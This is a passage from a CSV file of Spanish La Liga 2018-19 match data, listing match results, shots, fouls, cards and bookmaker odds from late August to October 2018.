Madrid,Vallecano,1,0,H,0,0,D,9,13,2,3,7,8,8,5,1,1,0,0,1.16,7,21,1.17,7.25,18,1.17,7.2,18.5,1.16,8.09,24.21,1.14,7,21,1.17,7.5,23,41,1.19,1.16,8.18,7.39,24.21,20.03,36,1.61,1.57,2.54,2.38,20,-2,1.91,1.85,2.06,2,1.17,7.82,22.59\r\nSP1,25/08/2018,Valladolid,Barcelona,0,1,A,0,0,D,7,10,4,5,13,11,6,10,1,1,0,0,17,7.5,1.16,15,7,1.19,13,7,1.2,19.07,8.18,1.18,17,7.5,1.15,21,7.5,1.18,41,21,16.55,8.4,7.56,1.2,1.17,34,1.47,1.42,2.94,2.8,20,2,2.13,2.07,1.83,1.79,18.04,7.67,1.19\r\nSP1,26/08/2018,Espanol,Valencia,2,0,H,0,0,D,19,16,9,4,16,12,6,10,1,1,0,0,3.25,3.2,2.37,2.95,3.3,2.45,3.1,3.3,2.35,3.19,3.48,2.35,3.1,3.4,2.25,3.1,3.4,2.3,39,3.25,3.08,3.48,3.3,2.47,2.37,34,2.16,2.07,1.81,1.74,19,0.25,1.9,1.84,2.08,2.02,2.9,3.34,2.62\r\nSP1,26/08/2018,Girona,Real Madrid,1,4,A,1,1,D,10,20,5,8,13,11,4,7,2,3,0,0,8,5.5,1.36,9.25,4.75,1.36,7,5.2,1.4,8.99,5.42,1.37,7,5.5,1.36,8.5,5.5,1.33,41,9.25,8.29,5.5,5.2,1.4,1.36,33,1.55,1.5,2.68,2.52,19,1.5,1.91,1.87,2.04,1.99,10.01,5.54,1.34\r\nSP1,26/08/2018,Sevilla,Villarreal,0,0,D,0,0,D,19,14,2,6,13,14,4,5,3,2,0,0,1.72,4.2,4.33,1.72,3.9,4.75,1.75,3.9,4.45,1.79,3.98,4.7,1.75,3.9,4.33,1.73,3.9,4.6,41,1.83,1.76,4.2,3.87,4.75,4.51,37,1.77,1.71,2.22,2.12,20,-1,2.42,2.34,1.67,1.61,2.05,3.6,3.86\r\nSP1,27/08/2018,Ath Bilbao,Huesca,2,2,D,0,0,D,14,9,4,4,17,17,3,2,2,2,0,0,1.61,3.6,6.5,1.6,3.75,6.5,1.63,3.8,5.7,1.64,3.8,6.45,1.65,3.6,5.5,1.62,3.8,6,41,1.68,1.63,3.95,3.75,6.5,5.95,38,2.1,2.01,1.85,1.79,20,-1,2.19,2.12,1.79,1.74,1.6,3.89,6.88\r\nSP1,27/08/2018,Levante,Celta,1,2,A,0,2,A,15,21,6,9,14,8,7,7,2,3,0,0,2.4,3.25,3,2.5,3.25,2.95,2.45,3.25,2.95,2.52,3.31,3.08,2.45,3.25,2.9,2.45,3.3,3,41,2.6,2.49,3.41,3.25,3.09,2.93,36,2.1,2.03,1.84,1.78,18,-0.25,2.19,2.12,1.81,1.76,2.28,3.63,3.21\r\nSP1,31/08/2018,Eibar,Sociedad,2,1,H,1,1,D,8,7,2,2,18,15,4,2,3,2,0,0,2.75,3.25,2.62,2.75,3.2,2.65,2.95,3.2,2.5,2.8,3.31,2.73,2.7,3.25,2.62,2.8,3.3,2.7,41,2.95,2.79,3.34,3.23,2.77,2.66,38,2.3,2.2,1.72,1.67,21,0.25,1.71,1.67,2.33,2.26,3.11,3.23,2.53\r\nSP1,31/08/2018,Getafe,Valladolid,0,0,D,0,0,D,12,7,3,4,22,14,6,7,3,1,0,0,1.9,3.2,4.75,1.85,3.25,5,1.9,3.2,4.7,1.93,3.18,5.22,1.91,3.2,4.5,1.95,3.25,4.8,41,1.99,1.91,3.3,3.18,5.35,4.86,37,2.68,2.59,1.54,1.49,21,-0.5,1.95,1.91,2,1.96,2.08,3.07,4.55\r\nSP1,31/08/2018,Villarreal,Girona,0,1,A,0,0,D,13,14,3,6,15,11,7,2,3,2,0,0,1.57,4,6,1.55,4.2,6,1.65,3.8,5.4,1.57,4.17,6.67,1.57,4,5.8,1.57,4.2,6.5,41,1.65,1.57,4.24,4.08,6.68,6.19,39,1.98,1.91,1.98,1.89,23,-1,2.01,1.97,1.94,1.88,1.52,4.54,6.81\r\nSP1,01/09/2018,Celta,Ath Madrid,2,0,H,0,0,D,10,9,4,0,12,14,2,8,4,5,0,1,5.5,3.4,1.75,5,3.6,1.75,4.8,3.7,1.75,4.93,3.66,1.81,4.6,3.4,1.8,5,3.6,1.8,41,5.5,4.83,3.77,3.58,1.85,1.78,38,2.19,2.1,1.8,1.72,21,0.75,1.87,1.84,2.07,2.02,5.17,3.69,1.78\r\nSP1,01/09/2018,Real Madrid,Leganes,4,1,H,1,1,D,17,8,8,3,11,11,8,1,1,1,0,0,1.12,9,21,1.12,8.75,23,1.12,9,20,1.13,9.73,25.14,1.1,9.5,21,1.11,10,31,41,1.14,1.12,10.3,9.31,31,23.88,34,1.38,1.33,3.4,3.23,21,-2.5,2.01,1.94,1.96,1.91,1.16,8.67,22.29\r\nSP1,02/09/2018,Alaves,Espanol,2,1,H,0,1,A,8,11,5,7,19,13,0,12,4,3,0,0,2.9,3.1,2.54,2.85,3.1,2.65,2.7,3.1,2.8,2.93,3.16,2.71,2.88,3.2,2.5,2.9,3.1,2.6,39,3.06,2.91,3.2,3.08,2.8,2.63,34,2.71,2.56,1.56,1.5,20,0.25,1.74,1.7,2.28,2.2,3.19,3.25,2.47\r\nSP1,02/09/2018,Barcelona,Huesca,8,2,H,3,2,H,31,7,15,3,6,12,9,4,1,2,0,0,1.08,11,29,1.06,12,36,1.07,13,26,1.09,13.22,30.82,1.05,13,34,1.06,13,41,41,1.1,1.07,15,12.43,52,33.38,35,1.24,1.21,4.7,4.3,21,-3,1.98,1.93,1.97,1.92,1.07,14.91,36.03\r\nSP1,02/09/2018,Betis,Sevilla,1,0,H,0,0,D,11,8,3,2,15,17,5,8,3,6,0,1,2.8,3.5,2.45,2.8,3.5,2.45,2.8,3.4,2.5,2.77,3.87,2.46,2.7,3.5,2.5,2.7,3.75,2.4,41,2.86,2.75,3.87,3.62,2.54,2.44,37,1.62,1.58,2.46,2.36,20,0.25,1.79,1.75,2.19,2.13,2.84,3.6,2.53\r\nSP1,02/09/2018,Levante,Valencia,2,2,D,2,1,H,13,18,4,5,14,10,3,5,4,2,1,0,3.75,3.4,2,3.7,3.3,2.1,3.4,3.3,2.2,3.61,3.59,2.13,3.4,3.6,2.05,3.6,3.6,2.1,41,3.8,3.51,3.69,3.5,2.2,2.09,39,1.91,1.82,2.07,1.99,21,0.25,2.11,2.06,1.85,1.81,3.6,3.54,2.15\r\nSP1,14/09/2018,Huesca,Vallecano,0,1,A,0,1,A,14,14,4,2,16,18,6,3,2,1,0,0,2.14,3.5,3.4,2.1,3.6,3.4,2.2,3.55,3.2,2.26,3.57,3.3,2.2,3.5,3.1,2.2,3.7,3.3,36,2.3,2.2,3.7,3.51,3.41,3.28,33,1.93,1.85,2.09,1.96,19,-0.25,1.95,1.91,2.01,1.96,2.43,3.41,3.13\r\nSP1,15/09/2018,Ath Bilbao,Real Madrid,1,1,D,1,0,H,11,16,3,6,18,6,1,2,6,2,0,0,6,4.33,1.53,5.5,4.4,1.57,5.2,4.45,1.57,5.46,4.7,1.58,5,4.5,1.57,5.75,4.5,1.57,39,6,5.47,4.7,4.46,1.6,1.57,38,1.53,1.48,2.71,2.59,23,1,1.99,1.94,1.95,1.91,6.5,4.43,1.53\r\nSP1,15/09/2018,Ath Madrid,Eibar,1,1,D,0,0,D,18,12,9,3,5,21,14,3,2,2,0,0,1.36,4.33,12,1.36,4.6,10,1.35,4.7,10,1.36,4.78,11.13,1.36,4.5,9,1.4,4.75,9.5,39,1.41,1.37,4.82,4.56,12,10.12,38,2.1,2.03,1.85,1.79,23,-1.25,2,1.94,1.98,1.92,1.42,4,12.96\r\nSP1,15/09/2018,Sociedad,Barcelona,1,2,A,1,0,H,8,12,5,6,18,8,1,6,1,1,0,0,7,5.25,1.4,7,5.25,1.4,6.5,4.7,1.45,7.05,5.46,1.41,6,4.8,1.44,7.5,5.25,1.4,39,7.5,6.8,5.46,5.08,1.48,1.42,30,1.48,1.44,2.88,2.72,23,1.25,2.04,1.98,1.95,1.88,8.62,5.22,1.38\r\nSP1,15/09/2018,Valencia,Betis,0,0,D,0,0,D,12,11,2,6,22,9,5,4,6,3,0,0,1.75,3.75,4.75,1.75,3.9,4.5,1.7,3.75,5,1.75,4.06,4.72,1.75,3.75,4.4,1.75,3.9,4.8,39,1.8,1.75,4.06,3.84,5,4.65,38,1.76,1.71,2.25,2.13,22,-0.75,2,1.94,1.96,1.91,1.7,4.22,4.95\r\nSP1,16/09/2018,Espanol,Levante,1,0,H,0,0,D,22,16,9,4,17,13,5,4,1,2,0,0,1.72,3.6,5.25,1.78,3.5,5,1.8,3.6,4.5,1.79,3.8,4.86,1.75,3.75,4.5,1.8,3.8,4.75,39,1.84,1.78,3.93,3.7,5.25,4.66,38,2.07,1.95,1.92,1.85,22,-0.75,2.08,2.01,1.89,1.85,1.66,4.15,5.39\r\nSP1,16/09/2018,Leganes,Villarreal,0,1,A,0,0,D,16,9,3,3,16,9,6,1,4,3,0,0,3,3.1,2.54,3.1,3.1,2.5,3,3.1,2.5,3.08,3.19,2.59,2.9,3.2,2.5,3.1,3.2,2.55,39,3.1,3.02,3.27,3.13,2.63,2.53,37,2.5,2.36,1.65,1.59,21,0.25,1.79,1.75,2.19,2.13,2.99,3.28,2.59\r\nSP1,16/09/2018,Sevilla,Getafe,0,2,A,0,2,A,15,10,1,5,10,22,7,1,3,6,0,0,1.55,4,7,1.53,4.1,6.5,1.57,4.05,5.9,1.56,4.18,6.65,1.57,3.9,5.8,1.57,4.1,6,39,1.61,1.56,4.19,4.01,7,6.25,38,1.98,1.9,2,1.9,23,-1,2.05,2,1.91,1.86,1.65,3.91,6.04\r\nSP1,16/09/2018,Valladolid,Alaves,0,1,A,0,0,D,15,10,5,4,9,12,7,2,3,2,0,0,2.2,3.1,3.6,2.15,3.1,3.8,2.2,3.05,3.7,2.25,3.13,3.83,2.25,2.9,3.6,2.2,3.1,3.7,36,2.25,2.21,3.2,3.06,3.88,3.71,34,2.69,2.55,1.54,1.5,19,-0.25,1.92,1.89,2.02,1.99,2.19,3.15,3.97\r\nSP1,17/09/2018,Girona,Celta,3,2,H,2,1,H,11,20,6,7,15,11,3,1,1,3,0,1,2.4,3.3,3,2.35,3.3,3.1,2.35,3.4,2.95,2.42,3.53,3.02,2.38,3.4,2.88,2.4,3.4,2.9,38,2.54,2.41,3.57,3.4,3.1,2.93,37,2,1.88,2.01,1.91,21,-0.25,2.11,2.06,1.85,1.81,2.28,3.62,3.18\r\nSP1,21/09/2018,Huesca,Sociedad,0,1,A,0,0,D,13,7,3,1,16,12,7,5,5,3,0,2,3.6,3.4,2.1,3.6,3.4,2.1,3.3,3.4,2.2,3.75,3.53,2.1,3.5,3.4,2.1,3.7,3.5,2.1,38,3.8,3.62,3.55,3.4,2.2,2.1,37,2.13,2.04,1.87,1.78,20,0.25,2.13,2.07,1.85,1.82,3.49,3.4,2.25\r\nSP1,22/09/2018,Celta,Valladolid,3,3,D,2,1,H,12,14,5,4,9,11,7,8,2,2,0,0,1.75,3.5,5.25,1.67,3.75,5.5,1.73,3.65,5,1.74,3.65,5.56,1.75,3.6,4.8,1.75,3.75,5.25,38,1.77,1.73,3.75,3.63,5.6,5.18,37,2.08,2.02,1.86,1.79,22,-1,2.41,2.33,1.66,1.63,1.76,3.54,5.56\r\nSP1,22/09/2018,Eibar,Leganes,1,0,H,0,0,D,14,4,3,2,16,17,5,2,1,1,0,0,2.04,3.2,4,2.1,3.2,3.8,2.05,3.2,4,2.08,3.35,4.02,2.05,3.25,3.8,2.05,3.3,4.2,38,2.11,2.06,3.35,3.23,4.2,3.95,36,2.55,2.44,1.61,1.55,20,-0.25,1.8,1.76,2.19,2.12,2.18,3.04,4.12\r\nSP1,22/09/2018,Getafe,Ath Madrid,0,2,A,0,1,A,11,7,2,4,12,15,1,5,1,2,1,0,5,3.3,1.8,5,3.2,1.85,5,3.2,1.85,5.22,3.32,1.86,4.75,3.3,1.83,5.2,3.3,1.87,38,5.3,5.04,3.32,3.23,1.92,1.86,34,2.8,2.68,1.5,1.45,20,0.75,1.78,1.75,2.18,2.13,6.34,3.22,1.79\r\nSP1,22/09/2018,Real Madrid,Espanol,1,0,H,1,0,H,19,10,5,3,5,16,8,3,2,2,0,0,1.18,7,15,1.19,7.5,13.5,1.2,7,13,1.2,7.17,17.23,1.2,7,12,1.22,7,15,38,1.22,1.2,7.65,7.01,18.1,14.36,33,1.43,1.38,3.1,2.94,21,-2,2.02,1.97,1.92,1.89,1.27,6.39,11.1\r\nSP1,22/09/2018,Vallecano,Alaves,1,5,A,1,2,A,13,11,4,7,14,12,8,4,1,2,1,0,2.04,3.4,3.6,2.15,3.3,3.6,2.2,3.4,3.3,2.16,3.54,3.53,2.1,3.4,3.5,2.15,3.5,3.6,38,2.2,2.12,3.6,3.41,3.7,3.55,37,2.16,2.08,1.8,1.74,21,-0.25,1.87,1.83,2.08,2.04,2.01,3.53,4.02\r\nSP1,23/09/2018,Barcelona,Girona,2,2,D,1,1,D,22,7,11,6,9,16,8,2,3,5,1,0,1.08,11,21,1.08,11.5,26,1.1,9.1,28,1.08,13.12,36.83,1.07,11,26,1.06,12,36,37,1.1,1.08,13.25,11.57,36.83,27.69,33,1.22,1.2,4.75,4.36,19,-2.75,1.86,1.82,2.11,2.06,1.11,11.76,23.38\r\nSP1,23/09/2018,Betis,Ath Bilbao,2,2,D,0,2,A,15,7,3,4,13,20,6,1,2,7,0,1,2.14,3.3,3.6,2.2,3.4,3.3,2.2,3.4,3.35,2.21,3.49,3.46,2.2,3.4,3.2,2.15,3.5,3.3,38,2.3,2.21,3.55,3.41,3.6,3.29,35,2.02,1.94,1.93,1.86,20,-0.25,1.93,1.9,2.01,1.97,2.16,3.41,3.72\r\nSP1,23/09/2018,Levante,Sevilla,2,6,A,1,4,A,19,20,10,9,5,18,8,4,1,1,0,0,3.5,3.6,2.04,3.4,3.4,2.15,3.3,3.65,2.1,3.34,3.7,2.17,3.2,3.7,2.1,3.3,3.8,2.15,38,3.6,3.32,3.8,3.64,2.17,2.12,37,1.75,1.68,2.25,2.17,20,0.25,2.05,2,1.9,1.86,3.61,4,2\r\nSP1,23/09/2018,Villarreal,Valencia,0,0,D,0,0,D,11,12,1,2,12,12,8,6,4,1,0,1,2.25,3.25,3.3,2.35,3.4,3,2.45,3.4,2.85,2.31,3.44,3.26,2.3,3.4,3,2.3,3.5,3.2,38,2.45,2.31,3.5,3.38,3.3,3.14,36,2,1.94,1.95,1.87,20,-0.25,2.02,1.98,1.93,1.89,2.26,3.34,3.54\r\nSP1,25/09/2018,Ath Madrid,Huesca,3,0,H,3,0,H,17,8,5,1,1,14,4,3,0,2,0,0,1.22,6,15,1.22,6.25,15,1.22,6.2,13.5,1.24,6.1,16.21,1.25,5.8,13,1.25,6.25,15,40,1.27,1.24,6.5,5.99,17,14.4,39,1.83,1.75,2.15,2.06,21,-1.75,2.07,2.01,2,1.87,1.19,7.15,18.55\r\nSP1,25/09/2018,Espanol,Eibar,1,0,H,0,0,D,9,8,5,1,8,8,4,3,2,2,0,0,1.9,3.3,4.5,1.91,3.3,4.4,1.95,3.2,4.4,1.96,3.33,4.63,1.95,3.3,4.2,1.95,3.3,4.6,40,2.01,1.94,3.4,3.27,4.8,4.44,38,2.5,2.39,1.62,1.57,20,-0.75,2.33,2.25,1.72,1.68,1.85,3.45,5.04\r\nSP1,25/09/2018,Sociedad,Vallecano,2,2,D,1,2,A,16,11,6,6,12,18,8,5,4,3,0,0,1.61,4,5.5,1.62,4,5.5,1.65,4,5,1.69,3.98,5.41,1.67,4,5,1.67,4.1,5.4,40,1.7,1.65,4.4,4.01,5.71,5.29,38,1.86,1.76,2.2,2.06,22,-1,2.2,2.12,1.85,1.75,1.66,3.98,5.66\r\nSP1,26/09/2018,Ath Bilbao,Villarreal,0,3,A,0,0,D,12,19,2,6,3,14,6,4,1,1,0,0,2.25,3.3,3.3,2.2,3.3,3.4,2.15,3.35,3.45,2.17,3.5,3.53,2.2,3.3,3.4,2.2,3.5,3.5,40,2.25,2.17,3.5,3.38,3.56,3.43,39,2.13,2.05,1.82,1.76,21,-0.25,1.9,1.87,2.04,2,2.21,3.45,3.52\r\nSP1,26/09/2018,Leganes,Barcelona,2,1,H,0,1,A,10,9,6,5,15,11,4,5,4,2,0,0,12,6,1.25,10.5,6.25,1.26,11,6.1,1.25,12.3,6.21,1.27,9.5,6,1.29,11.5,6,1.29,40,13,10.97,6.55,5.98,1.31,1.27,35,1.55,1.5,2.63,2.52,20,1.5,2.12,2.07,1.85,1.8,12.58,5.98,1.27\r\nSP1,26/09/2018,Sevilla,Real Madrid,3,0,H,3,0,H,16,21,7,3,16,12,5,6,3,4,0,0,4.33,4.2,1.72,4.33,4.2,1.72,4.05,4.2,1.75,4.23,4.27,1.79,3.9,4.2,1.8,4.33,4.4,1.75,40,4.33,4.16,4.4,4.23,1.81,1.76,35,1.45,1.42,2.88,2.79,22,1,1.72,1.66,2.32,2.26,4.44,4.29,1.76\r\nSP1,26/09/2018,Valencia,Celta,1,1,D,1,0,H,14,9,5,3,18,7,0,2,1,3,0,0,1.66,4,4.75,1.7,4,4.75,1.85,3.8,4,1.71,4.17,4.84,1.73,4.2,4.4,1.73,4.2,4.75,39,1.85,1.72,4.2,4.04,4.84,4.58,37,1.67,1.62,2.38,2.26,21,-1,2.4,2.24,1.73,1.67,1.66,4.34,5.07\r\nSP1,27/09/2018,Alaves,Getafe,1,1,D,0,0,D,15,13,2,5,8,22,5,7,4,2,0,0,2.8,3,2.75,2.8,3,2.75,2.8,2.9,2.85,2.84,3.02,2.89,2.8,3,2.8,2.8,3,2.8,40,2.85,2.8,3.1,2.97,2.91,2.82,36,2.85,2.67,1.48,1.45,20,-0.25,2.47,2.36,1.65,1.62,2.95,3.03,2.81\r\nSP1,27/09/2018,Girona,Betis,0,1,A,0,0,D,8,14,2,6,17,14,5,1,1,3,0,0,2.5,3.3,2.87,2.55,3.4,2.75,2.5,3.4,2.8,2.55,3.54,2.82,2.5,3.5,2.75,2.5,3.5,2.75,40,2.57,2.51,3.54,3.42,2.87,2.8,38,1.98,1.89,1.98,1.9,20,-0.25,2.21,2.16,1.76,1.73,2.54,3.38,2.98\r\nSP1,27/09/2018,Valladolid,Levante,2,1,H,0,0,D,20,9,6,4,17,10,8,6,1,4,0,1,2.04,3.5,3.6,2.05,3.5,3.6,2.05,3.45,3.6,2.09,3.64,3.63,2.1,3.5,3.5,2.05,3.5,3.6,39,2.11,2.07,3.65,3.51,3.75,3.56,37,2.07,1.99,1.87,1.81,20,-0.25,1.83,1.79,2.14,2.08,2.07,3.69,3.66\r\nSP1,28/09/2018,Vallecano,Espanol,2,2,D,1,2,A,11,12,5,5,13,16,5,3,3,3,0,0,2.8,3.3,2.6,2.7,3.2,2.75,2.75,3.25,2.65,2.8,3.37,2.7,2.75,3.3,2.6,2.8,3.3,2.7,38,2.83,2.74,3.37,3.27,2.75,2.67,36,2.13,2.05,1.85,1.77,22,0.25,1.7,1.67,2.35,2.27,3.21,3.4,2.39\r\nSP1,29/09/2018,Barcelona,Ath Bilbao,1,1,D,0,1,A,20,8,8,2,9,18,4,3,3,3,0,0,1.16,7.5,17,1.16,8,16.5,1.17,7.5,15,1.15,8.49,20.57,1.15,8.5,15,1.17,9,17,38,1.18,1.16,9,8.17,21,17.47,32,1.36,1.31,3.6,3.35,21,-2.25,1.97,1.92,2,1.94,1.22,6.63,16.12\r\nSP1,29/09/2018,Eibar,Sevilla,1,3,A,0,0,D,15,7,2,5,16,9,6,3,2,3,0,0,3.3,3.4,2.2,3.2,3.5,2.2,3.2,3.4,2.25,3.26,3.54,2.27,3.2,3.4,2.25,3.3,3.4,2.3,38,3.3,3.22,3.54,3.41,2.31,2.25,36,2,1.95,1.93,1.85,21,0.25,1.95,1.92,2,1.95,3.24,3.66,2.25\r\nSP1,29/09/2018,Real Madrid,Ath Madrid,0,0,D,0,0,D,15,8,6,3,7,17,8,6,3,4,0,0,2,3.5,3.75,2.1,3.4,3.6,2.1,3.4,3.5,2.11,3.38,3.85,2.1,3.5,3.4,2.1,3.5,3.7,38,2.15,2.09,3.6,3.42,3.9,3.64,36,1.95,1.88,2,1.92,22,-0.25,1.85,1.8,2.14,2.08,2.24,3.35,3.57\r\nSP1,29/09/2018,Sociedad,Valencia,0,1,A,0,1,A,10,9,5,2,13,18,3,0,3,5,0,0,2.2,3.4,3.2,2.25,3.4,3.2,2.3,3.4,3.1,2.34,3.52,3.14,2.38,3.4,3,2.38,3.5,3.1,37,2.38,2.29,3.6,3.44,3.25,3.13,35,1.99,1.92,1.95,1.87,22,-0.25,2.04,1.99,1.95,1.87,2.52,3.28,3.09\r\nSP1,30/09/2018,Betis,Leganes,1,0,H,0,0,D,17,11,4,5,7,10,7,1,0,4,0,0,1.64,3.8,5.5,1.67,3.8,5.25,1.67,3.75,5.3,1.69,3.91,5.5,1.7,3.7,5.25,1.67,3.8,5.4,38,1.75,1.68,4,3.76,5.6,5.3,36,2.1,2.04,1.85,1.78,22,-1,2.35,2.25,1.75,1.67,1.78,3.66,5.16\r\nSP1,30/09/2018,Huesca,Girona,1,1,D,0,1,A,13,14,6,4,14,14,5,5,4,2,0,0,2.5,3.3,2.9,2.55,3.2,2.9,2.45,3.2,3,2.52,3.34,3,2.5,3.3,2.9,2.55,3.3,3,38,2.56,2.47,3.35,3.24,3.1,2.99,37,2.25,2.13,1.76,1.71,21,-0.25,2.17,2.12,1.82,1.77,2.61,3.36,2.92\r\nSP1,30/09/2018,Levante,Alaves,2,1,H,2,1,H,14,14,4,2,22,19,9,4,7,1,0,0,2.14,3.5,3.3,2.2,3.3,3.4,2.15,3.4,3.35,2.22,3.52,3.39,2.2,3.4,3.3,2.15,3.5,3.3,38,2.25,2.19,3.52,3.38,3.55,3.38,35,2.1,2,1.87,1.81,21,-0.25,1.94,1.89,2.03,1.97,2.14,3.62,3.55\r\nSP1,30/09/2018,Villarreal,Valladolid,0,1,A,0,0,D,27,9,7,3,17,12,7,2,3,3,0,0,1.53,4,6.5,1.55,3.9,6.75,1.55,4.05,6.2,1.55,4.18,6.89,1.57,4,6,1.53,4.1,6.5,38,1.6,1.55,4.25,4.03,7,6.42,36,2,1.96,1.9,1.84,23,-1,2.01,1.97,1.95,1.89,1.51,4.34,7.32\r\nSP1,01/10/2018,Celta,Getafe,1,1,D,1,0,H,8,12,2,4,13,15,3,9,2,2,0,0,2,3.5,3.8,2,3.3,4,2,3.35,4,2.02,3.38,4.17,2.05,3.4,3.75,1.95,3.5,3.9,37,2.05,2,3.5,3.36,4.25,3.95,35,2.17,2.1,1.8,1.73,19,-0.75,2.37,2.32,1.66,1.64,2.31,3.26,3.46\r\nSP1,05/10/2018,Ath Bilbao,Sociedad,1,3,A,1,1,D,13,6,5,3,15,19,11,0,6,5,0,0,2.04,3.4,3.8,2.05,3.4,3.75,2.2,3.2,3.5,2.1,3.48,3.81,2.1,3.4,3.6,2.1,3.4,3.8,37,2.2,2.08,3.55,3.39,3.9,3.73,36,2.13,2.06,1.85,1.76,17,-0.25,1.8,1.78,2.17,2.1,2.07,3.35,4.1\r\nSP1,06/10/2018,Alaves,Real Madrid,1,0,H,0,0,D,8,13,4,6,20,10,4,3,1,0,0,0,9,4.75,1.36,7.75,4.75,1.4,7,4.5,1.45,8.47,5.06,1.4,7.5,5,1.4,8.5,5,1.4,37,9.5,8.13,5.5,4.94,1.45,1.39,32,1.6,1.53,1.66,1.59,18,1.25,2.15,2.06,1.88,1.8,10.23,5.11,1.35\r\nSP1,06/10/2018,Getafe,Levante,0,1,A,0,0,D,15,12,4,3,17,18,10,2,4,5,1,0,1.72,3.6,5.25,1.72,3.6,5.25,1.75,3.7,4.8,1.7,3.91,5.41,1.75,3.5,5,1.73,3.8,5.2,37,1.79,1.73,3.95,3.71,5.43,5.1,35,2.05,1.95,1.93,1.85,20,-1,2.4,2.31,1.7,1.64,1.76,3.86,4.98\r\nSP1,06/10/2018,Girona,Eibar,2,3,A,2,2,D,10,12,3,4,9,17,4,9,3,6,0,0,2.1,3.2,3.8,2.15,3.3,3.6,2.1,3.25,3.7,2.13,3.43,3.79,2.15,3.3,3.6,2.15,3.3,3.8,36,2.23,2.15,3.43,3.27,3.85,3.67,35,2.43,2.32,1.64,1.6,19,-0.25,1.86,1.83,2.11,2.05,2.33,3.25,3.48\r\nSP1,06/10/2018,Leganes,Vallecano,1,0,H,1,0,H,13,6,4,2,12,12,6,4,1,4,0,1,2,3.3,4,2.1,3.25,3.75,2.1,3.3,3.6,2.1,3.42,3.9,2.1,3.25,3.75,2.15,3.3,3.8,37,2.15,2.09,3.42,3.3,4.01,3.78,36,2.3,2.2,1.71,1.67,18,-0.25,1.83,1.77,2.17,2.11,2.19,3.25,3.83\r\nSP1,07/10/2018,Ath Madrid,Betis,1,0,H,0,0,D,13,5,5,0,16,10,6,4,5,3,0,0,1.44,4,9,1.48,3.9,8.25,1.5,3.9,7.6,1.5,4,8.86,1.52,4,7,1.5,4,7.5,37,1.55,1.49,4.2,3.95,9.3,8.15,36,2.3,2.19,1.72,1.67,20,-1,1.95,1.86,2.06,1.99,1.6,3.77,7.22\r\nSP1,07/10/2018,Espanol,Villarreal,3,1,H,1,1,D,28,13,12,6,13,8,10,3,3,2,0,0,2.25,3.2,3.4,2.25,3.2,3.4,2.3,3.2,3.3,2.34,3.25,3.46,2.35,3.2,3.2,2.3,3.2,3.3,37,2.35,2.31,3.25,3.19,3.46,3.33,36,2.4,2.27,1.67,1.63,18,-0.25,2.03,1.97,1.95,1.9,2.4,3.25,3.34\r\nSP1,07/10/2018,Sevilla,Celta,2,1,H,1,0,H,12,13,3,5,14,9,8,8,3,4,0,1,1.53,4.33,6,1.55,4.5,5.5,1.55,4.2,5.9,1.58,4.55,5.66,1.57,4.5,5.25,1.53,4.6,5.5,37,1.6,1.56,4.75,4.49,6,5.51,31,1.55,1.47,2.75,2.62,20,-1,1.93,1.89,2.01,1.96,1.47,5,6.58\r\nSP1,07/10/2018,Valencia,Barcelona,1,1,D,1,1,D,10,10,3,5,11,6,5,2,2,2,0,0,4.75,4.2,1.64,4.6,4.1,1.7,4.6,4.3,1.65,4.98,4.16,1.7,4.5,4,1.73,4.6,4.2,1.67,37,5,4.68,4.33,4.12,1.75,1.69,33,1.6,1.54,2.55,2.43,20,1,1.8,1.72,2.25,2.16,5.74,4.05,1.65\r\nSP1,07/10/2018,Valladolid,Huesca,1,0,H,1,0,H,9,11,3,1,9,13,6,2,1,2,0,0,1.9,3.5,4.2,1.9,3.5,4.25,1.93,3.4,4.2,1.97,3.48,4.3,1.95,3.5,4,1.93,3.5,4.4,37,1.97,1.92,3.55,3.47,4.46,4.24,36,2.2,2.13,1.77,1.71,18,-0.75,2.31,2.21,1.75,1.7,1.93,3.55,4.43\r\nSP1,19/10/2018,Celta,Alaves,0,1,A,0,0,D,19,9,9,2,9,12,6,2,2,3,0,0,1.66,4,5,1.75,3.75,4.75,1.85,3.5,4.4,1.72,3.93,5.2,1.73,3.8,4.8,1.73,3.9,5.25,36,1.93,1.73,4,3.77,5.25,4.89,33,1.96,1.88,2.02,1.92,18,-1,2.81,2.32,1.75,1.65,1.77,3.86,4.91\r\nSP1,20/10/2018,Barcelona,Sevilla,4,2,H,2,0,H,23,19,9,7,10,16,5,7,0,1,0,0,1.33,6,7.5,1.34,6,7.25,1.35,5.8,7,1.35,6.29,7.4,1.33,5.5,8,1.33,6,8,39,1.39,1.34,6.5,5.96,8.5,7.5,32,1.3,1.26,4.05,3.72,19,-1.75,2.1,2,1.91,1.86,1.28,6.58,9.87\r\nSP1,20/10/2018,Real Madrid,Levante,1,2,A,0,2,A,34,6,12,2,10,19,15,1,1,2,0,0,1.14,8.5,19,1.15,8.75,16,1.17,8.3,14.5,1.15,9.03,18.28,1.15,8.5,15,1.15,9,20,39,1.19,1.15,9.25,8.52,20.95,16.34,32,1.29,1.24,4.33,3.92,20,-2.25,1.98,1.85,2.07,2.02,1.15,8.62,20.52\r\nSP1,20/10/2018,Valencia,Leganes,1,1,D,0,0,D,18,7,4,5,9,13,10,1,1,2,0,0,1.5,4,7.5,1.55,4,6.5,1.65,4,5.1,1.56,4.13,6.84,1.57,3.9,6,1.55,4.1,7,39,1.65,1.55,4.2,3.99,7.5,6.52,37,2.15,2.07,1.8,1.75,21,-1,2.05,1.98,2,1.88,1.62,3.72,6.96\r\nSP1,20/10/2018,Villarreal,Ath Madrid,1,1,D,0,0,D,18,15,6,4,16,9,8,7,3,1,0,0,3.8,3.1,2.14,3.6,3.1,2.2,3.8,3.15,2.15,3.87,3.22,2.19,3.7,3.1,2.15,3.8,3.2,2.2,39,3.95,3.71,3.25,3.14,2.25,2.18,36,2.63,2.47,1.6,1.54,18,0.25,2.08,2.03,1.9,1.84,4.04,3.21,2.14\r\nSP1,21/10/2018,Betis,Valladolid,0,1,A,0,1,A,20,6,4,2,7,10,9,6,0,4,0,0,1.61,3.8,6,1.65,3.75,5.5,1.7,3.8,4.9,1.63,4.08,5.85,1.62,3.75,5.8,1.62,4,5.5,39,1.7,1.63,4.1,3.91,6,5.55,36,2.04,1.98,1.9,1.83,21,-1,2.2,2.13,1.85,1.75,1.56,4.13,6.7\r\nSP1,21/10/2018,Eibar,Ath 